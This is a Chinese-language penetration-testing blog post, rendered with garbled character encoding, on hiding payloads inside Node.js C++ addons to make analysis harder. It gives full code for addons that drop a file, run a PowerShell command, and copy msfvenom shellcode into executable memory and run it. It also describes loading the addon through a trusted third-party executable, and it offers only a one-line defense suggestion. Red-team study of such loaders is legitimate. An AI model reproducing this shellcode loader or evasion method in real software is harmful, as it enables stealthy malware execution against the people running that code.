I"®+<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Node.js-Downloader%E7%9A%84%E5%AE%9E%E7%8E%B0">ã€Šæ¸—é€æµ‹è¯•ä¸­çš„Node.jsâ€”â€”Downloaderçš„å®ç°ã€‹</a>å¼€æºäº†ä¸€ä¸ªä½¿ç”¨Node.jså®ç°Downloaderçš„ä»£ç ï¼Œç®€è¦åˆ†æåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨æ€è·¯ã€‚</p>

<p>Node.jsçš„è¯­æ³•ç®€å•æ˜“æ‡‚ï¼Œæ‰€ä»¥Node.jsä»£ç ä¹Ÿå¾ˆå®¹æ˜“è¢«åˆ†æã€‚</p>

<p>ä¸ºäº†å¢åŠ Node.jsä»£ç è¢«åˆ†æçš„éš¾åº¦ï¼Œæˆ‘çš„æ€è·¯æ˜¯åˆ©ç”¨Node.jsçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå°†payloadä»¥C++æ’ä»¶çš„å½¢å¼è¿›è¡Œå°è£…ã€‚</p>

<p>è¿™æ ·ä¸ä½†èƒ½å¤Ÿå¢åŠ Node.jsä»£ç è¢«åˆ†æçš„éš¾åº¦ï¼Œè€Œä¸”å¯ä»¥ç”¨C++ä»£ç æ¥å®ç°payloadï¼Œå·²æœ‰çš„C++ä»£ç ç»è¿‡ç®€å•çš„ä¿®æ”¹å³å¯ä½¿ç”¨ï¼Œå‡å°äºŒæ¬¡å¼€å‘çš„æˆæœ¬ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>C++æ’ä»¶ç®€ä»‹</li>
  <li>æ­å»ºC++æ’ä»¶çš„å¼€å‘ç¯å¢ƒ</li>
  <li>C++æ’ä»¶ä»£ç å®ä¾‹</li>
  <li>åˆ©ç”¨æ€è·¯</li>
  <li>é˜²å¾¡å»ºè®®</li>
</ul>

<h2 id="0x02-cæ’ä»¶ç®€ä»‹">0x02 C++æ’ä»¶ç®€ä»‹</h2>
<hr />

<p>Node.js C++æ’ä»¶æ˜¯ç”¨C++ç¼–å†™çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå¯ä»¥ä½¿ç”¨require()å‡½æ•°åŠ è½½åˆ°Node.jsä¸­ã€‚åˆ©ç”¨V8æä¾›çš„APIï¼Œå¯ä»¥å®ç°JavaScriptå’ŒC++çš„äº’ç›¸è°ƒç”¨ï¼Œæ‰“é€šJavaScriptå’ŒC++ä¹‹é—´çš„æ¥å£ã€‚</p>

<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>

<p>https://nodejs.org/api/addons.html</p>

<p>ä½¿ç”¨å®ä¾‹ï¼š</p>

<ol>
  <li>
    <p>ç¼–è¯‘æˆåŠŸä¸€ä¸ªC++æ’ä»¶ï¼Œå¯¼å‡ºæ–¹æ³•ä¸ºï¼šhello</p>
  </li>
  <li>
    <p>ä½¿ç”¨Node.jsè°ƒç”¨C++æ’ä»¶å¯¼å‡ºæ–¹æ³•çš„ä»£ç å¦‚ä¸‹ï¼š</p>
  </li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
addon.hello();
</code></pre></div></div>

<ol>
  <li>æ‰§è¡Œä»£ç </li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe test.js
</code></pre></div></div>

<h2 id="0x03-æ­å»ºcæ’ä»¶çš„å¼€å‘ç¯å¢ƒ">0x03 æ­å»ºC++æ’ä»¶çš„å¼€å‘ç¯å¢ƒ</h2>
<hr />

<h3 id="1windowså¼€å‘ç¯å¢ƒ">1ã€Windowså¼€å‘ç¯å¢ƒ</h3>

<p>æµ‹è¯•ç³»ç»Ÿï¼šWin7sp1 x64</p>

<p>éœ€è¦å®‰è£…ä»¥ä¸‹å·¥å…·ï¼š</p>

<ul>
  <li>.NET Framework 4.5.1æˆ–æ›´é«˜ç‰ˆæœ¬</li>
  <li>Python 2.7</li>
  <li>Visual Studio 2015æˆ–æ›´é«˜ç‰ˆæœ¬</li>
</ul>

<p>å…·ä½“æ­å»ºæµç¨‹å¦‚ä¸‹ï¼š</p>

<p>1.å®‰è£….NET Framework 4.5.1</p>

<p>https://www.microsoft.com/en-US/download/details.aspx?id=5842</p>

<p>2.ä¸‹è½½Node.js</p>

<p>https://nodejs.org/en/download/</p>

<p>3.ä½¿ç”¨Windows-Build-Toolsè‡ªåŠ¨å®‰è£…ä¾èµ–å·¥å…·</p>

<p>https://github.com/felixrieseberg/windows-build-tools</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd c:\
powershell
npm install --global windows-build-tools
</code></pre></div></div>

<p>å¦‚æœå®‰è£…å¤±è´¥ï¼Œå¯é€‰æ‹©æ‰‹åŠ¨å®‰è£…ä»¥ä¸‹å·¥å…·ï¼š</p>

<ul>
  <li>Python 2.7</li>
  <li>Visual Studio 2015æˆ–æ›´é«˜ç‰ˆæœ¬</li>
</ul>

<p>4.å®‰è£…node-gyp</p>

<p>https://github.com/nodejs/node-gyp</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install -g node-gyp
</code></pre></div></div>

<h3 id="2linuxå¼€å‘ç¯å¢ƒ">2ã€Linuxå¼€å‘ç¯å¢ƒ</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://nodejs.org/dist/v10.15.3/node-v10.15.3-linux-x64.tar.xz
tar xf node-v10.15.3-linux-x64.tar.xz
cd node-v10.15.3-linux-x64
cd bin
export PATH=/root/node-v10.15.3-linux-x64/bin:$PATH
./npm install -g node-gyp
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>éœ€è¦æ·»åŠ ç¯å¢ƒå˜é‡æŒ‡å®šnodeçš„ä½ç½®(<code class="language-plaintext highlighter-rouge">export PATH=/root/node-v10.15.3-linux-x64/bin:$PATH</code>)ï¼Œå¦åˆ™åœ¨æ‰§è¡Œnpm installä¼šå¤±è´¥ï¼Œæç¤º<code class="language-plaintext highlighter-rouge">/usr/bin/env: â€˜nodeâ€™: No such file or directory</code></p>

<p>å®ä¾‹æ¼”ç¤ºï¼š</p>

<ol>
  <li>hello.cc:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
namespace demo {
using v8::FunctionCallbackInfo;
using v8::Isolate;
using v8::Local;
using v8::NewStringType;
using v8::Object;
using v8::String;
using v8::Value;

void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
  Isolate* isolate = args.GetIsolate();
  args.GetReturnValue().Set(String::NewFromUtf8(
      isolate, "world", NewStringType::kNormal).ToLocalChecked());
}

void Initialize(Local&lt;Object&gt; exports) {
  NODE_SET_METHOD(exports, "hello", Method);
}

NODE_MODULE(NODE_GYP_MODULE_NAME, Initialize)

}  // namespace demo
</code></pre></div></div>

<ol>
  <li>binding.gyp</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "targets": [
    {
      "target_name": "addon",
      "sources": [ "hello.cc" ]
    }
  ]
}
</code></pre></div></div>

<ol>
  <li>é€šè¿‡node-gypç¼–è¯‘ï¼Œç”Ÿæˆæ’ä»¶</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure
node-gyp build
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¯ä»¥åˆå¹¶æˆä¸€æ¡å‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure build
</code></pre></div></div>

<p>Node.jsæ”¯æŒäº¤å‰ç¼–è¯‘ï¼Œå…·ä½“å‚æ•°è¯´æ˜å¯å‚è€ƒï¼š</p>

<p>https://www.npmjs.com/package/node-pre-gyp</p>

<p>Linuxç³»ç»Ÿä¸‹ç”ŸæˆWindows64ä½ç³»ç»Ÿä¸‹ä½¿ç”¨çš„æ’ä»¶å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure build --target_arch=x64 --target_platform=win32
</code></pre></div></div>

<h2 id="0x04-cæ’ä»¶ä»£ç å®ä¾‹">0x04 C++æ’ä»¶ä»£ç å®ä¾‹</h2>
<hr />

<p>åœ¨å¼€å‘æ—¶ï¼Œæœ€å¥½é¿å…å‡ºç°ifè¿™ç§çš„æ¡ä»¶åˆ¤æ–­è¯­å¥ï¼Œç›´æ¥ä½¿ç”¨ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯</p>

<h3 id="1-é‡Šæ”¾æ–‡ä»¶">1. é‡Šæ”¾æ–‡ä»¶</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
#include &lt;stdio.h&gt;
namespace demo {
	using v8::FunctionCallbackInfo;
	using v8::Isolate;
	using v8::Local;
	using v8::Object;
	using v8::String;
	using v8::Value;

	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
		FILE* fp;
		fopen_s(&amp;fp, "new.txt", "ab+");
		char *buf = "123456";
		fwrite(buf, strlen(buf), 1, fp);
		fseek(fp, 0, SEEK_END);
		fclose(fp);
	}

	void init(Local&lt;Object&gt; exports) {
		NODE_SET_METHOD(exports, "hello", Method);
	}
	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
}
</code></pre></div></div>

<h3 id="2-æ‰§è¡Œå‘½ä»¤">2. æ‰§è¡Œå‘½ä»¤ï¼š</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
namespace demo {
	using v8::FunctionCallbackInfo;
	using v8::Isolate;
	using v8::Local;
	using v8::Object;
	using v8::String;
	using v8::Value;

	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
		system("powershell start calc.exe");
	}

	void init(Local&lt;Object&gt; exports) {
		NODE_SET_METHOD(exports, "hello", Method);
	}
	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
}
</code></pre></div></div>

<h3 id="3æ‰§è¡Œshellcode">3.æ‰§è¡Œshellcode</h3>

<p>ç”Ÿæˆshellcodeï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c
</code></pre></div></div>

<p>åŠ è½½shellcodeå¹¶æ‰§è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
#include &lt;Windows.h&gt;
namespace demo {
	using v8::FunctionCallbackInfo;
	using v8::Isolate;
	using v8::Local;
	using v8::Object;
	using v8::String;
	using v8::Value;

	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
		unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
			"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
			"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
			"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
			"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
			"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
			"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
			"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
			"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
			"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
			"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
			"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
			"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
			"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
			"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
			"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
			"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
			"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
			"\x63\x2e\x65\x78\x65\x00";
		void *sc = VirtualAlloc(0, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(sc, shellcode, sizeof(shellcode));
		(*(int(*)()) sc)();

	}

	void init(Local&lt;Object&gt; exports) {
		NODE_SET_METHOD(exports, "hello", Method);
	}
	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
}
</code></pre></div></div>

<p>ç¼–è¯‘å¥½çš„æ’ä»¶å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/test/raw/master/addon.node</p>

<p>ä»¥ä¸Šæ’ä»¶ä»£ç çš„å¯¼å‡ºæ–¹æ³•å‡ä¸º<code class="language-plaintext highlighter-rouge">hello</code>ï¼Œè°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
addon.hello();
</code></pre></div></div>

<h2 id="0x05-åˆ©ç”¨æ€è·¯">0x05 åˆ©ç”¨æ€è·¯</h2>
<hr />

<p>1ã€è¢«ç¬¬ä¸‰æ–¹å¯ä¿¡ç¨‹åºåŠ è½½</p>

<p>å‚è€ƒï¼š</p>

<p>https://bbs.pediy.com/thread-249573.htm</p>

<p><code class="language-plaintext highlighter-rouge">t.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">node.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">main.js</code></p>

<p>main.jsä¸addon.nodeæ”¾åœ¨åŒçº§ç›®å½•ï¼Œmain.jsçš„å†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
addon.hello();
</code></pre></div></div>

<p>addon.nodeçš„æ ¼å¼ä¸ºdllæ–‡ä»¶ï¼Œæ— æ³•ç›´æ¥è·å¾—payloadï¼Œå¢åŠ é™æ€åˆ†æçš„æˆæœ¬</p>

<h2 id="0x06-é˜²å¾¡å»ºè®®">0x06 é˜²å¾¡å»ºè®®</h2>
<hr />

<p>å¯¹t.exeçš„å­è¿›ç¨‹(node.exe)è¡Œä¸ºè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæœ‰å¯ç–‘è¡Œä¸ºè¿›è¡Œæ‹¦æˆªï¼Œå–æ¶ˆå¯¹è¯¥è¯ä¹¦çš„ä¿¡ä»»</p>

<h2 id="0x07-å°ç»“">0x07 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†Node.jsä¸­C++æ’ä»¶çš„ç”¨æ³•ï¼Œå¯ä»¥ç”¨æ¥å¢åŠ Node.jsä»£ç è¢«åˆ†æçš„éš¾åº¦ï¼Œæœ€ååˆ†äº«äº†ä¸‰ä¸ªpayloadçš„å†™æ³•ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET